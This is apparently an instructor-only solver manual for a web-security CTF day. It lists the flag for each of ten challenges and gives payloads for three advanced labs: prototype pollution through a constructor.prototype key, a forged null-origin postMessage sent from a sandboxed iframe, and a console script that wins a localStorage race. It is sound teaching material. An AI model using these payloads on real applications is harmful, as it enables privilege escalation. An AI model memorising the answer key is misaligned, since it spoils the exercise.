# Day 7 — Web Applications: Admin Solver Manual (v2.1)

> **Instructor use only.** Expected recoveries for the live Day 7 pack.

## Why v2.1

v2’s top tier (Blind Counter / Friendly Sink / Triple Lock) scored like
Easy–Medium Web (~3–4/10). v2.1 replaces that tier with **three real Danger
labs**: prototype pollution, null-origin `postMessage`, and a 180ms TOCTOU race.
Still **zero files**. ChatGPT cannot click the race or invent the sandboxed
widget without the student doing browser work.

## Pack summary

| | |
|--|--|
| Count | **10** — 3 easy · 4 medium · **3 danger** |
| Day code | `WEB-2026` |
| Files | **None** |
| Flag model | All `is_dynamic` |

## Answer map

| # | ID | Title | Level | Where | Answer |
|---|-----|-------|-------|-------|--------|
| 1 | `d7_markup_trail` | Markup Trail | Easy | `/challenge/markup-trail` | `ink_below` |
| 2 | `d7_side_door` | Side Door | Easy | `/challenge/side-door` → `/hatch` | `service_hatch` |
| 3 | `d7_desk_wizard` | Desk Wizard | Easy | `/challenge/desk-wizard` | `quiet_path` |
| 4 | `d7_role_chip` | Role Chip | Medium | `/challenge/role-chip` | `analyst_seat` |
| 5 | `d7_twin_check` | Twin Check | Medium | `/challenge/twin-check` | `both_match` |
| 6 | `d7_frame_whisper` | Frame Whisper | Medium | `/challenge/frame-whisper` | `posted_secret` |
| 7 | `d7_stash_order` | Stash Order | Medium | `/challenge/stash-order` | `abc_order` |
| 8 | `d7_inherited_trust` | Inherited Trust | Danger | `/challenge/inherited-trust` | `chief_clearance` |
| 9 | `d7_cross_talk` | Cross Talk | Danger | `/challenge/cross-talk` | `null_origin_ok` |
| 10 | `d7_flash_seat` | Flash Seat | Danger | `/challenge/flash-seat` | `race_won` |

---

## 1–7 · Easy / Medium

Unchanged from v2 — see previous sections in git history if needed. Short form:

1. Markup Trail → `ink` + `_bel` + comment `ow` → **`ink_below`**
2. Side Door → visit lobby then `/challenge/side-door/hatch` → **`service_hatch`**
3. Desk Wizard → walk / quiet / none → `sessionStorage d7_desk_recovery` → **`quiet_path`**
4. Role Chip → cookie `d7_role` JSON `role` → `analyst` → **`analyst_seat`**
5. Twin Check → mirror cookie `d7_pair` into the form → **`both_match`**
6. Frame Whisper → catch iframe `postMessage` → **`posted_secret`**
7. Stash Order → Network drawers `alpha/beta/gamma` into `d7_stash_a/b/c` → **`abc_order`**

---

## 8 · Inherited Trust (danger) — prototype pollution

Merge blocks only the literal key `__proto__`. Payload:

```json
{"constructor":{"prototype":{"deskRole":"chief"}}}
```

Merge settings → **`chief_clearance`**.

## 9 · Cross Talk (danger) — null-origin postMessage

Page rejects any elevate whose `event.origin` is not the string `"null"` /
empty. Load this as the sandboxed widget (sandbox is already `allow-scripts`
only — no `allow-same-origin`):

```html
<script>parent.postMessage({elevate:true}, '*')</script>
```

→ **`null_origin_ok`**.

## 10 · Flash Seat (danger) — 180ms TOCTOU

1. Ensure `localStorage.d7_flash_role === 'guest'` (default).
2. In one burst (console or snippet), within **180ms**:
   - click Reserve (while guest)
   - set `localStorage.d7_flash_role = 'admin'`
   - click Confirm

Example console helper:

```js
document.querySelectorAll('button').forEach(b => { if (b.textContent.includes('Reserve')) b.click(); });
localStorage.setItem('d7_flash_role', 'admin');
document.querySelectorAll('button').forEach(b => { if (b.textContent.includes('Confirm')) b.click(); });
```

→ **`race_won`**.

Setting admin *before* Reserve fails (snapshot must be guest).

---

## Instructor notes

- Day code: `WEB-2026`.
- Do not strengthen hints mid-event.
- Routes: `src/pages/day7/` + `App.tsx`.
- Migration: `supabase/migrations/20260712_2230_day7_three_real_dangers.sql`.
